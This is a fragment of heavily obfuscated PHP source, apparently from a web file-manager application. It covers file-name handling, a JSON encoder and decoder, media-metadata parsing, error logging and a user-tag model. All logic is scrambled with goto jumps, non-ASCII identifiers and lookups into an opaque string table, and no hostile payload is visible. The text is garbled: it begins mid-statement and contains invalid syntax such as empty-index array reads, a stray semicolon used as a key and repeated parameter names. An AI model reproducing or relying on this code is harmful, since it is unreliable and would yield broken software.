$Aמ) { goto e߫; FڅҶ: foreach ($fི as $Aպٵ => $E󯭜ē) { $A[$c얄[372]] = $this->fileTypeWhere($Aպٵ); $bƙ҂[$Aպٵ] = array($c얄[2383] => $E󯭜ē[$c얄[28]], $c얄[2384] => $this->where($A)->count(), $c얄[522] => $this->where($A)->sum($c얄[77])); } Cache::set($F㣝, $bƙ҂, 1200); return $bƙ҂; goto dն꒚; B: $bƙ҂ = array(); $bƙ҂[$c얄[2382]] = array($c얄[2383] => LNG($c얄[2382]), $c얄[2384] => $this->where($A)->count(), $c얄[522] => $this->where($A)->sum($c얄[77])); $fི = KodIO::fileTypeList(); goto FڅҶ; e߫: $c얄 =& $_SERVER[]; $F㣝 = $c얄[2381] . $c֎ӂ . $c얄[70] . $Aמ; $A߅䛤 = Cache::get($F㣝); goto A; A: if ($A߅䛤) { return $A߅䛤; } $A = array($c얄[520] => 0); if ($c֎ӂ != !1) { $A[$c얄[458]] = $c֎ӂ; $A[$c얄[371]] = $Aמ; } goto B; dն꒚: } public function fileNameExist($cċ, $cĊԆ) { $b̯ۚ =& $_SERVER[]; $f = $this->childList($cċ); foreach ($f as $Bڨ) { if ($Bڨ[$b̯ۚ[28]] == $cĊԆ) { return $Bڨ[$b̯ۚ[369]]; } } return !1; } public function childList($Eӂ) { goto b뷫; B: self::$cacheChildList[$C] = $Fɵ; foreach ($Fɵ as $cǵʃ) { $C = $Cʌ[410] . $cǵʃ[$Cʌ[369]]; self::$cacheSourceInfo[$C] = $cǵʃ; } return $Fɵ; goto b턖̈́; b뷫: $Cʌ =& $_SERVER[]; $C = $Cʌ[2360] . $Eӂ; if (isset(self::$cacheChildList[$C])) { return self::$cacheChildList[$C]; } goto b; b: $D± = array($Cʌ[463] => intval($Eӂ), $Cʌ[397] => 0); $Fɵ = $this->where($D±)->select(); $Fɵ = $Fɵ ? $Fɵ : array(); goto B; b턖̈́: } public function fileNameAuto($DʠϽ, $DՖ, $fЄ꺿 = REPEAT_RENAME, $d࿚ϋ = false) { $F =& $_SERVER[]; $d = $this->childList($DʠϽ); $CԄ߯ = array_to_keyvalue($d, $F[33], $F[28]); return $this->fileNameAutoGet($CԄ߯, $DՖ, $fЄ꺿, $d࿚ϋ); } public function fileNameAutoGet($C顝, $a߫, $f켌, $b) { $Cք =& $_SERVER[]; if ($f켌 == REPEAT_REPLACE || !$C顝 || !in_array_not_case($a߫, $C顝) || $b && $f켌 != REPEAT_RENAME_FOLDER) { return $a߫; } if ($f켌 == REPEAT_SKIP) { return !1; } $Dާ = $Cք[91] . get_path_ext($a߫); $Dާ = $Dާ == $Cք[91] || $b ? $Cք[33] : $Dާ; for ($b = 1; $b <= count($C顝) + 1; $b++) { $C = substr($a߫, 0, strlen($a߫) - strlen($Dާ)); $F = $C . "\x28{$b}\51{$Dާ}"; if (!in_array_not_case($F, $C顝)) { return $F; } } } } goto f; Dߍ: define($_SERVER[][1941], 32); class Services_JSON { function __construct($B = 0) { $this->use = $B; } function utf162utf8($Bߊ) { $Dۜ题 =& $_SERVER[]; if (function_exists($Dۜ题[68])) { return mb_convert_encoding($Bߊ, $Dۜ题[1590], $Dۜ题[1942]); } $bׇ = ord($Bߊ[0]) << 8 | ord($Bߊ[1]); switch (!0) { case (127 & $bׇ) == $bׇ: return chr(127 & $bׇ); case (2047 & $bׇ) == $bׇ: return chr(192 | $bׇ >> 6 & 31) . chr(128 | $bׇ & 63); case (65535 & $bׇ) == $bׇ: return chr(224 | $bׇ >> 12 & 15) . chr(128 | $bׇ >> 6 & 63) . chr(128 | $bׇ & 63); } return $Dۜ题[33]; } function utf82utf16($aᅘ) { $aϰ =& $_SERVER[]; if (function_exists($aϰ[68])) { return mb_convert_encoding($aᅘ, $aϰ[1942], $aϰ[1590]); } switch (strlen($aᅘ)) { case 1: return $aᅘ; case 2: return chr(7 & ord($aᅘ[0]) >> 2) . chr(192 & ord($aᅘ[0]) << 6 | 63 & ord($aᅘ[1])); case 3: return chr(240 & ord($aᅘ[0]) << 4 | 15 & ord($aᅘ[1]) >> 2) . chr(192 & ord($aᅘ[1]) << 6 | 127 & ord($aᅘ[2])); } return $aϰ[33]; } function encode($FōЭ) { $dƫ =& $_SERVER[]; switch (gettype($FōЭ)) { case $dƫ[1601]: return $FōЭ ? $dƫ[1600] : $dƫ[1602]; case $dƫ[1943]: return $dƫ[99]; case $dƫ[303]: return (int) $FōЭ; case $dƫ[278]: case $dƫ[277]: return (double) $FōЭ; case $dƫ[312]: $fފ = $dƫ[33]; $eϧ֠ = strlen($FōЭ); for ($Aɋԑ = 0; $Aɋԑ < $eϧ֠; ++$Aɋԑ) { $f㩕ۍ = ord($FōЭ[$Aɋԑ]); switch (!0) { case $f㩕ۍ == 8: $fފ .= $dƫ[1944]; break; case $f㩕ۍ == 9: $fފ .= $dƫ[1577]; break; case $f㩕ۍ == 10: $fފ .= $dƫ[1575]; break; case $f㩕ۍ == 12: $fފ .= $dƫ[1945]; break; case $f㩕ۍ == 13: $fފ .= $dƫ[1576]; break; case $f㩕ۍ == 34: case $f㩕ۍ == 47: case $f㩕ۍ == 92: $fފ .= $dƫ[93] . $FōЭ[$Aɋԑ]; break; case $f㩕ۍ >= 32 && $f㩕ۍ <= 127: $fފ .= $FōЭ[$Aɋԑ]; break; case ($f㩕ۍ & 224) == 192: $Fΐ = pack($dƫ[1946], $f㩕ۍ, ord($FōЭ[$Aɋԑ + 1])); $Aɋԑ += 1; $bꦯƄ = $this->utf82utf16($Fΐ); $fފ .= sprintf($dƫ[1947], bin2hex($bꦯƄ)); break; case ($f㩕ۍ & 240) == 224: $Fΐ = pack($dƫ[1946], $f㩕ۍ, ord($FōЭ[$Aɋԑ + 1]), ord($FōЭ[$Aɋԑ + 2])); $Aɋԑ += 2; $bꦯƄ = $this->utf82utf16($Fΐ); $fފ .= sprintf($dƫ[1947], bin2hex($bꦯƄ)); break; case ($f㩕ۍ & 248) == 240: $Fΐ = pack($dƫ[1946], $f㩕ۍ, ord($FōЭ[$Aɋԑ + 1]), ord($FōЭ[$Aɋԑ + 2]), ord($FōЭ[$Aɋԑ + 3])); $Aɋԑ += 3; $bꦯƄ = $this->utf82utf16($Fΐ); $fފ .= sprintf($dƫ[1947], bin2hex($bꦯƄ)); break; case ($f㩕ۍ & 252) == 248: $Fΐ = pack($dƫ[1946], $f㩕ۍ, ord($FōЭ[$Aɋԑ + 1]), ord($FōЭ[$Aɋԑ + 2]), ord($FōЭ[$Aɋԑ + 3]), ord($FōЭ[$Aɋԑ + 4])); $Aɋԑ += 4; $bꦯƄ = $this->utf82utf16($Fΐ); $fފ .= sprintf($dƫ[1947], bin2hex($bꦯƄ)); break; case ($f㩕ۍ & 254) == 252: $Fΐ = pack($dƫ[1946], $f㩕ۍ, ord($FōЭ[$Aɋԑ + 1]), ord($FōЭ[$Aɋԑ + 2]), ord($FōЭ[$Aɋԑ + 3]), ord($FōЭ[$Aɋԑ + 4]), ord($FōЭ[$Aɋԑ + 5])); $Aɋԑ += 5; $bꦯƄ = $this->utf82utf16($Fΐ); $fފ .= sprintf($dƫ[1947], bin2hex($bꦯƄ)); break; } } return $dƫ[113] . $fފ . $dƫ[113]; case $dƫ[1948]: if (is_array($FōЭ) && count($FōЭ) && array_keys($FōЭ) !== range(0, sizeof($FōЭ) - 1)) { $ç = array_map(array($this, $dƫ[1949]), array_keys($FōЭ), array_values($FōЭ)); foreach ($ç as $d茑ŉ) { if (Services_JSON::isError($d茑ŉ)) { return $d茑ŉ; } } return $dƫ[1070] . join($dƫ[47], $ç) . $dƫ[315]; } $e = array_map(array($this, $dƫ[1950]), $FōЭ); foreach ($e as $bϭˍ) { if (Services_JSON::isError($bϭˍ)) { return $bϭˍ; } } return $dƫ[157] . join($dƫ[47], $e) . $dƫ[478]; case $dƫ[1951]: $Bᶬ = get_object_vars($FōЭ); $ç = array_map(array($this, $dƫ[1949]), array_keys($Bᶬ), array_values($Bᶬ)); foreach ($ç as $d茑ŉ) { if (Services_JSON::isError($d茑ŉ)) { return $d茑ŉ; } } return $dƫ[1070] . join($dƫ[47], $ç) . $dƫ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dƫ[99] : new Services_JSON_Error(gettype($FōЭ) . $dƫ[1952]); } } function name_value($eړ, $a󑸿) { $A = $this->encode($a󑸿); if (Services_JSON::isError($A)) { return $A; } return $this->encode(strval($eړ)) . $_SERVER[][4] . $A; } function reduce_string($A) { $F˺ī =& $_SERVER[]; $A = preg_replace(array($F˺ī[1953], $F˺ī[1954], $F˺ī[1955]), $F˺ī[33], $A); return trim($A); } function decode($e) { $DÂ =& $_SERVER[]; $e = $this->reduce_string($e); switch (strtolower($e)) { case $DÂ[1600]: return !0; case $DÂ[1602]: return !1; case $DÂ[99]: return null; default: $e㏊񅾯 = array(); if (is_numeric($e)) { return (double) $e == (int) $e ? (int) $e : (double) $e; } elseif (preg_match($DÂ[1956], $e, $e㏊񅾯) && $e㏊񅾯[1] == $e㏊񅾯[2]) { $AҎ = substr($e, 0, 1); $A΋ = substr($e, 1, -1); $Fź = $DÂ[33]; $Fȥ֌ = strlen($A΋); for ($e = 0; $e < $Fȥ֌; ++$e) { $Aȱ⣙ = substr($A΋, $e, 2); $aۊĠ = ord($A΋[$e]); switch (!0) { case $Aȱ⣙ == $DÂ[1944]: $Fź .= chr(8); ++$e; break; case $Aȱ⣙ == $DÂ[1577]: $Fź .= chr(9); ++$e; break; case $Aȱ⣙ == $DÂ[1575]: $Fź .= chr(10); ++$e; break; case $Aȱ⣙ == $DÂ[1945]: $Fź .= chr(12); ++$e; break; case $Aȱ⣙ == $DÂ[1576]: $Fź .= chr(13); ++$e; break; case $Aȱ⣙ == $DÂ[1357]: case $Aȱ⣙ == $DÂ[1957]: case $Aȱ⣙ == $DÂ[1570]: case $Aȱ⣙ == $DÂ[1572]: if ($AҎ == $DÂ[113] && $Aȱ⣙ != $DÂ[1957] || $AҎ == $DÂ[55] && $Aȱ⣙ != $DÂ[1357]) { $Fź .= $A΋[++$e]; } break; case preg_match($DÂ[1958], substr($A΋, $e, 6)): $b = chr(hexdec(substr($A΋, $e + 2, 2))) . chr(hexdec(substr($A΋, $e + 4, 2))); $Fź .= $this->utf162utf8($b); $e += 5; break; case $aۊĠ >= 32 && $aۊĠ <= 127: $Fź .= $A΋[$e]; break; case ($aۊĠ & 224) == 192: $Fź .= substr($A΋, $e, 2); ++$e; break; case ($aۊĠ & 240) == 224: $Fź .= substr($A΋, $e, 3); $e += 2; break; case ($aۊĠ & 248) == 240: $Fź .= substr($A΋, $e, 4); $e += 3; break; case ($aۊĠ & 252) == 248: $Fź .= substr($A΋, $e, 5); $e += 4; break; case ($aۊĠ & 254) == 252: $Fź .= substr($A΋, $e, 6); $e += 5; break; } } return $Fź; } elseif (preg_match($DÂ[1959], $e) || preg_match($DÂ[1960], $e)) { goto d; fⰠ: for ($e = 0; $e <= $Fȥ֌; ++$e) { $A = end($Fψ۴); $Aȱ⣙ = substr($A΋, $e, 2); if ($e == $Fȥ֌ || $A΋[$e] == $DÂ[47] && $A[$DÂ[1961]] == SERVICES_JSON_SLICE) { $bᢋ = substr($A΋, $A[$DÂ[263]], $e - $A[$DÂ[263]]); array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_SLICE, $DÂ[263] => $e + 1, $DÂ[1962] => !1)); if (reset($Fψ۴) == SERVICES_JSON_IN_ARR) { array_push($D, $this->decode($bᢋ)); } elseif (reset($Fψ۴) == SERVICES_JSON_IN_OBJ) { $dŔ = array(); if (preg_match($DÂ[1963], $bᢋ, $dŔ)) { $f = $this->decode($dŔ[1]); $bǹ܍ = $this->decode($dŔ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C۶[$f] = $bǹ܍; } else { $C۶->{$f} = $bǹ܍; } } elseif (preg_match($DÂ[1964], $bᢋ, $dŔ)) { $f = $dŔ[1]; $bǹ܍ = $this->decode($dŔ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C۶[$f] = $bǹ܍; } else { $C۶->{$f} = $bǹ܍; } } } } elseif (($A΋[$e] == $DÂ[113] || $A΋[$e] == $DÂ[55]) && $A[$DÂ[1961]] != SERVICES_JSON_IN_STR) { array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_IN_STR, $DÂ[263] => $e, $DÂ[1962] => $A΋[$e])); } elseif ($A΋[$e] == $A[$DÂ[1962]] && $A[$DÂ[1961]] == SERVICES_JSON_IN_STR && (strlen(substr($A΋, 0, $e)) - strlen(rtrim(substr($A΋, 0, $e), $DÂ[93]))) % 2 != 1) { array_pop($Fψ۴); } elseif ($A΋[$e] == $DÂ[157] && in_array($A[$DÂ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_IN_ARR, $DÂ[263] => $e, $DÂ[1962] => !1)); } elseif ($A΋[$e] == $DÂ[478] && $A[$DÂ[1961]] == SERVICES_JSON_IN_ARR) { array_pop($Fψ۴); } elseif ($A΋[$e] == $DÂ[1070] && in_array($A[$DÂ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_IN_OBJ, $DÂ[263] => $e, $DÂ[1962] => !1)); } elseif ($A΋[$e] == $DÂ[315] && $A[$DÂ[1961]] == SERVICES_JSON_IN_OBJ) { array_pop($Fψ۴); } elseif ($Aȱ⣙ == $DÂ[1965] && in_array($A[$DÂ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_IN_CMT, $DÂ[263] => $e, $DÂ[1962] => !1)); $e++; } elseif ($Aȱ⣙ == $DÂ[1966] && $A[$DÂ[1961]] == SERVICES_JSON_IN_CMT) { array_pop($Fψ۴); $e++; for ($Cיօ = $A[$DÂ[263]]; $Cיօ <= $e; ++$Cיօ) { $A΋ = substr_replace($A΋, $DÂ[50], $Cיօ, 1); } } } if (reset($Fψ۴) == SERVICES_JSON_IN_ARR) { return $D; } elseif (reset($Fψ۴) == SERVICES_JSON_IN_OBJ) { return $C۶; } goto cп; D: $A΋ = $this->reduce_string($A΋); if ($A΋ == $DÂ[33]) { if (reset($Fψ۴) == SERVICES_JSON_IN_ARR) { return $D; } else { return $C۶; } } $Fȥ֌ = strlen($A΋); goto fⰠ; d: if ($e[0] == $DÂ[157]) { $Fψ۴ = array(SERVICES_JSON_IN_ARR); $D = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Fψ۴ = array(SERVICES_JSON_IN_OBJ); $C۶ = array(); } else { $Fψ۴ = array(SERVICES_JSON_IN_OBJ); $C۶ = new stdClass(); } } array_push($Fψ۴, array($DÂ[1961] => SERVICES_JSON_SLICE, $DÂ[263] => 0, $DÂ[1962] => !1)); $A΋ = substr($e, 1, -1); goto D; cп: } } } function isError($E, $D = null) { $E =& $_SERVER[]; if (class_exists($E[1967])) { return PEAR::isError($E, $D); } elseif (is_object($E) && (get_class($E) == $E[1968] || is_subclass_of($E, $E[1968]))) { return !0; } return !1; } } if (class_exists($_SERVER[][1969])) { class Services_JSON_Error extends PEAR_Error { function __construct($f = "\165\x6e\153\156\x6f\167\156\x20\x65\162\x72\157\x72", $C巹 = null, $a = null, $aȟʨ = null, $Aޚ = null) { parent::PEAR_Error($f, $C巹, $a, $aȟʨ, $Aޚ); } } } else { class Services_JSON_Error { function __construct($c = "\165\156\x6b\x6e\x6f\167\x6e\40\145\x72\x72\x6f\x72", $C = null, $c = null, $C◉ = null, $d珘ƥ = null) { } } } goto aȽ; fѹ: class GetInfo { private static $fileTypeArray; public static function get($d) { $cկ = IO::info($d); return self::infoAdd($cկ); } public static function check() { } public static function infoAdd(&$a) { goto dӃ; e«: $EЊ = $a[$e[160]]; try { if ($a[$e[160]] == $e[1614]) { $Bԉ = self::psdParse($FՎ߾); $EЊ = $e[1615]; } else { if ($a[$e[160]] == $e[1616]) { $Bԉ = self::pdfParse($FՎ߾); } else { $EЊ = self::$fileTypeArray[$e[1617]][$a[$e[160]]]; $A = self::$fileTypeArray[$e[1618]][$EЊ][$e[1619]]; $F = @$AС->analyze($FՎ߾, $a[$e[77]], $a[$e[28]]); $Bԉ = self::parseData($F, $A, $a); } } } catch (Exception $fă) { $Bԉ = array($e[372] => $EЊ); } if (!$Bԉ) { return; } goto cտ; e: if (!$a || $a[$e[29]] != $e[167]) { return; } if (!self::support($a[$e[160]]) || isset($a[$e[426]])) { return; } $FՎ߾ = $e[1613] . $a[$e[75]]; goto e«; dӃ: $e =& $_SERVER[]; static $AС; if (!$AС) { require SDK_DIR . $e[1612]; $AС = new getID3(); } goto e; cտ: $Bԉ = self::arrayValueLimit($Bԉ); $Bԉ[$e[372]] = $EЊ; $a[$e[426]] = $Bԉ; goto b; b: return $a; goto dƸ; dƸ: } public static function support($AÚݦ) { goto C핬; e: $f¢ = array($Eܼ[1616], $Eܼ[1614]); if (in_array($AÚݦ, $f¢)) { return !0; } if (isset(self::$fileTypeArray[$Eܼ[1617]][$AÚݦ])) { return !0; } goto eȇ; eȇ: return !1; goto CԦ; C핬: $Eܼ =& $_SERVER[]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $AÚݦ = strtolower($AÚݦ); goto e; CԦ: } public static function arrayValueLimit($a؟, $a = 5000) { if (!is_array($a؟)) { return $a؟; } foreach ($a؟ as $a => $a؉ܼ) { if (is_string($a؉ܼ) && strlen($a؉ܼ) > $a) { $a؟[$a] = substr($a؉ܼ, 0, $a); } else { if (is_array($a؉ܼ)) { $a؟[$a] = self::arrayValueLimit($a؉ܼ, $a); } } } return $a؟; } private static function parseData($FޔŐ, $Dݵ, $E) { $A䒛 =& $_SERVER[]; $E펔ڎ = $FޔŐ[$A䒛[1620]]; $fΌ = array(); foreach ($Dݵ as $b; => $A) { foreach ($A as $FïƂ) { if (is_array($FïƂ)) { $eՇ = self::parseData($FޔŐ, $A, $E); if ($eՇ) { $fΌ[$b;] = $eՇ; } break; } $Fˈ = str_replace($A䒛[1390], $E펔ڎ, $FïƂ); $eՇ = _get($FޔŐ, $Fˈ); $eՇ = is_array($eՇ) ? $eՇ[0] : $eՇ; if ($eՇ) { break; } } if ($eՇ || $eՇ === 0 || $eՇ === !1) { $eՇ = self::valueReset($FïƂ, $eՇ, $b;); if ($eՇ !== null) { $fΌ[$b;] = $eՇ; } } } $fΌ = self::valueResetAll($fΌ, $E); return $fΌ; } private static function psdParse($f案̓) { $E =& $_SERVER[]; if (IO::fileSubstr($f案̓, 0, 4) != $E[1621]) { return !1; } $f֢ױ = getImageSize($f案̓, $d顏ᚆ); if (!$f֢ױ) { return; } $b = array($E[1536] => $f֢ױ[0], $E[1538] => $f֢ױ[1]); return $b; } private static function pdfParse($DԄ) { return FileParsePdf::parse($DԄ); } private static function fileTypeParse() { $d =& $_SERVER[]; $F寐 = self::fileTypeArray(); $fƊ = array(); foreach ($F寐 as $E => $BԻ) { $E㟊ڷ = _get($BԻ, $d[160], $d[33]); $a = is_string($E㟊ڷ) ? explode($d[47], $E㟊ڷ) : $E㟊ڷ; if (!$a) { continue; } foreach ($a as $E㟊ڷ) { $E㟊ڷ = strtolower(trim($E㟊ڷ)); if (!$E㟊ڷ) { continue; } $fƊ[$E㟊ڷ] = $E; } $F寐[$E][$d[160]] = array_keys($fƊ); $F寐[$E][$d[1619]] = self::parseKeyMap($BԻ[$d[1619]]); } return array($d[1618] => $F寐, $d[1617] => $fƊ); } private static function parseKeyMap($Aτޏ) { $d򇡭 =& $_SERVER[]; foreach ($Aτޏ as $Cύ => $Dӑܿ) { if (is_array($Dӑܿ)) { $f鷫 = self::parseKeyMap($Dӑܿ); if ($f鷫) { $Aτޏ[$Cύ] = $f鷫; } continue; } $FΩ = explode($d򇡭[47], $Dӑܿ); $Bܨ = array(); foreach ($FΩ as $aɇ) { $aɇ = trim($aɇ); if (!$aɇ) { continue; } if (preg_match($d򇡭[1622], $aɇ, $a⤕)) { $a򳊅 = explode($d򇡭[271], $a⤕[1]); foreach ($a򳊅 as $E֕؋) { $Bܨ[] = str_replace($a⤕[0], $E֕؋, $aɇ); } } else { $Bܨ[] = $aɇ; } } $Aτޏ[$Cύ] = $Bܨ; } return $Aτޏ; } private static function valueResetAll($Bɍ, $d) { goto aР; aР: $a =& $_SERVER[]; if (isset($Bɍ[$a[1623]])) { $cʌ = ceil($Bɍ[$a[1623]]); $E𶴪 = intval($cʌ / 3600); $c = intval(($cʌ - $E𶴪 * 3600) / 60); $c = $cʌ % 60; $Bɍ[$a[1624]] = sprintf($a[1625], $E𶴪, $c, $c); if ($E𶴪 == 0) { $Bɍ[$a[1624]] = sprintf($a[1626], $c, $c); } } $b㯊 = _get($Bɍ, $a[1627]); goto dǗ; a˳: return $Bɍ; goto Eҿ; dǗ: if ($b㯊) { $e֏ = IO_PATH_SYSTEM_TEMP . $a[1628] . KodIO::hashPath($d) . $a[1629]; $Bɍ[$a[1630]] = Action($a[1631])->pluginCacheFileSet($e֏, $b㯊); unset($Bɍ[$a[1632]][$a[1615]]); } $fꃧ = _get($Bɍ, $a[1633], $a[33]); $Dφٵ = _get($Bɍ, $a[1634], $a[33]); goto BŒ; BŒ: $fԣ = _get($Bɍ, $a[1635], $a[33]); $Aս = $fꃧ . $Dφٵ . $fԣ; if ($Aս && get_charset($Aս) != $a[326]) { $Bɍ[$a[1632]][$a[1343]] = iconv_to($Bɍ[$a[1632]][$a[1343]], get_charset($Aս), $a[326]); $Bɍ[$a[1632]][$a[1636]] = iconv_to($Bɍ[$a[1632]][$a[1636]], get_charset($Aս), $a[326]); $Bɍ[$a[1632]][$a[1637]] = iconv_to($Bɍ[$a[1632]][$a[1637]], get_charset($Aս), $a[326]); } goto a˳; Eҿ: } private static function valueReset($f昗, $cה, $C֏ԝ) { $f錭 =& $_SERVER[]; $b = $f錭[1553]; switch ($f昗) { case $f錭[1638]: $cה = $cה == $f錭[83] ? $f錭[1639] : $f錭[1640]; break; case $f錭[1641]: $cה = $cה ? $cה : null; break; default: break; } switch ($C֏ԝ) { case $f錭[1642]: $cה = round($cה, 2); break; case $f錭[187]: case $f錭[107]: if ($cה < 0) { $cה = null; } else { if (is_numeric($cה)) { $cה = date($b, $cה); } } break; default: break; } return $cה; } private static function fileTypeArray() { $Ḙ =& $_SERVER[]; return array($Ḙ[1615] => array($Ḙ[160] => $Ḙ[1643] . $Ḙ[1644], $Ḙ[1619] => array($Ḙ[1536] => $Ḙ[1645], $Ḙ[1538] => $Ḙ[1646], $Ḙ[1647] => $Ḙ[1648], $Ḙ[1649] => $Ḙ[1650], $Ḙ[187] => $Ḙ[1651], $Ḙ[107] => $Ḙ[1652], $Ḙ[1653] => $Ḙ[1654], $Ḙ[1655] => $Ḙ[1656], $Ḙ[1657] => $Ḙ[1658], $Ḙ[1659] => $Ḙ[1660], $Ḙ[1661] => $Ḙ[1662], $Ḙ[1663] => $Ḙ[1664], $Ḙ[1665] => $Ḙ[1666], $Ḙ[1667] => array($Ḙ[1668] => $Ḙ[1669], $Ḙ[1670] => $Ḙ[1671], $Ḙ[1672] => $Ḙ[1673]), $Ḙ[1674] => $Ḙ[1675], $Ḙ[1676] => $Ḙ[1677], $Ḙ[1678] => $Ḙ[1679], $Ḙ[1680] => $Ḙ[1681], $Ḙ[1682] => array($Ḙ[1683] => $Ḙ[1684], $Ḙ[1685] => $Ḙ[1686], $Ḙ[1687] => $Ḙ[1688], $Ḙ[1689] => $Ḙ[1690], $Ḙ[1691] => $Ḙ[1692], $Ḙ[1693] => $Ḙ[1694], $Ḙ[1695] => $Ḙ[1696], $Ḙ[1697] => $Ḙ[1698], $Ḙ[1699] => $Ḙ[1700], $Ḙ[1701] => $Ḙ[1702], $Ḙ[1703] => $Ḙ[1704]))), $Ḙ[1705] => array($Ḙ[160] => $Ḙ[1706] . $Ḙ[1707], $Ḙ[1619] => array($Ḙ[1623] => $Ḙ[1708], $Ḙ[187] => $Ḙ[1709], $Ḙ[107] => $Ḙ[1710], $Ḙ[1655] => $Ḙ[1711], $Ḙ[1712] => $Ḙ[1713], $Ḙ[1714] => $Ḙ[1641], $Ḙ[1715] => $Ḙ[1716], $Ḙ[1717] => $Ḙ[1718], $Ḙ[1719] => $Ḙ[1720], $Ḙ[1632] => array($Ḙ[1343] => $Ḙ[1721], $Ḙ[1636] => $Ḙ[1722], $Ḙ[1637] => $Ḙ[1723], $Ḙ[1724] => $Ḙ[1725], $Ḙ[1726] => $Ḙ[1727], $Ḙ[1728] => $Ḙ[1729], $Ḙ[1615] => $Ḙ[1730]))), $Ḙ[1731] => array($Ḙ[160] => $Ḙ[1732] . $Ḙ[1733], $Ḙ[1619] => array($Ḙ[1536] => $Ḙ[1734], $Ḙ[1538] => $Ḙ[1735], $Ḙ[1623] => $Ḙ[1708], $Ḙ[187] => $Ḙ[1736], $Ḙ[107] => $Ḙ[1737], $Ḙ[1642] => $Ḙ[1738], $Ḙ[1719] => $Ḙ[1739], $Ḙ[1715] => $Ḙ[1740], $Ḙ[1655] => $Ḙ[1741], $Ḙ[1705] => array($Ḙ[1714] => $Ḙ[1641], $Ḙ[1742] => $Ḙ[1743], $Ḙ[1712] => $Ḙ[1713], $Ḙ[1719] => $Ḙ[1720], $Ḙ[1715] => $Ḙ[1744], $Ḙ[1717] => $Ḙ[1718]))), $Ḙ[1745] => array($Ḙ[1619] => array($Ḙ[1746] => $Ḙ[1747], $Ḙ[1748] => $Ḙ[1749])), $Ḙ[1750] => array($Ḙ[1619] => array())); } } function exif_read_data_io($E, $Cʏ֍ = null, $b = false, $f = false) { $Fϕ = StreamWrapperIO::read($E, 0, 1024 * 64); $C = $_SERVER[][1751] . base64_encode($Fϕ); return exif_read_data($C, $Cʏ֍, $b, $f); } function getimagesize_io($D, &$B = false) { $cɒ = StreamWrapperIO::read($D, 0, 1024 * 64); $D = $_SERVER[][1751] . base64_encode($cɒ); return getimagesize($D, $B); } goto FÏѴ; D: function beforeShutdown() { Hook::trigger($_SERVER[ņӺ][32]); } $_SERVER[$_SERVER[ņӺ][33]] = BASIC_PATH; $_SERVER[$_SERVER[ņӺ][34]] = LIB_DIR; goto Eނ; Eނ: function beforeShutdownError($F = false, $f = '', $fȐʰ = '', $eìؽ = 0) { $fʾ齃 =& $_SERVER[ņӺ]; switch ($F) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $e׽˄ = $fʾ齃[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $e׽˄ = $fʾ齃[36]; break; case E_STRICT: $e׽˄ = $fʾ齃[37]; break; case E_NOTICE: case E_USER_NOTICE: $e׽˄ = $fʾ齃[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $e׽˄ = $fʾ齃[39]; break; default: break; } if (!$e׽˄ || $e׽˄ == $fʾ齃[38] || $e׽˄ == $fʾ齃[39]) { return; } $fȐʰ = $fʾ齃[4] . str_replace($_SERVER[$fʾ齃[33]], $fʾ齃[16], $fȐʰ); $F = $e׽˄ . $fʾ齃[40] . $f . $fʾ齃[40] . $fȐʰ . $fʾ齃[40] . $eìؽ; write_log($F . $fʾ齃[41] . get_caller_msg(1), $fʾ齃[15]); } $_SERVER[$_SERVER[ņӺ][42]] = $_SERVER[$_SERVER[ņӺ][33]] . $_SERVER[ņӺ][43]; $fʳ읆 = strrev(base64_decode($_SERVER[ņӺ][44])); goto Dؖ; Fܡ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($CĲ˼ގ) { $DӴ =& $_SERVER[]; return array($DӴ[2204] => array(USER_ID, $DӴ[2205])); } protected function listData() { $A =& $_SERVER[]; $c텶 = array($A[1428] => USER_ID, $A[436] => array($A[2208], 0)); $Aꋵ = $A[2210]; $E̊ = $this->field($Aꋵ)->where($c텶)->order($A[2211])->select(); return $E̊ ? $E̊ : array(); } protected function listByTag($EƲ) { } protected function addToTag($Bܙ, $C隃) { $eЛ =& $_SERVER[]; if (!Model($eЛ[2334])->listData($C隃) || !Model($eЛ[751])->pathInfo($Bܙ)) { return !1; } $EɄ = array($eЛ[1428] => USER_ID, $eЛ[436] => $C隃, $eЛ[387] => $Bܙ, $eЛ[388] => $eЛ[382], $eЛ[386] => $eЛ[33], $eЛ[2112] => 0); if ($this->where($EɄ)->find()) { return !1; } return $this->add($EɄ); } protected function removeFromTag($B, $F蓴ϒ) { $Fƚ =& $_SERVER[]; if (!Model($Fƚ[2334])->listData($F蓴ϒ)) { return !1; } if (is_array($B)) { $B = array($Fƚ[7], $B); } $A։̡ = array($Fƚ[1428] => USER_ID, $Fƚ[436] => $F蓴ϒ, $Fƚ[388] => $Fƚ[382], $Fƚ[387] => $B); return $this->where($A։̡)->delete(); } protected function removeByTag($D) { $bð禥 =& $_SERVER[]; if (!$D) { return !1; } $Eٙ = array($bð禥[1428] => USER_ID, $bð禥[436] => $D); return $this->where($Eٙ)->delete(); } protected function removeBySource($F첆) { $Cމ =& $_SERVER[]; if (is_array($F첆)) { $F첆 = array($Cމ[7], $F첆); } $Aܔ = array($Cމ[1428] => USER_ID, $Cމ[387] => $F첆, $Cމ[436] => array($Cމ[929], 0)); return $this->where($Aܔ)->delete(); } }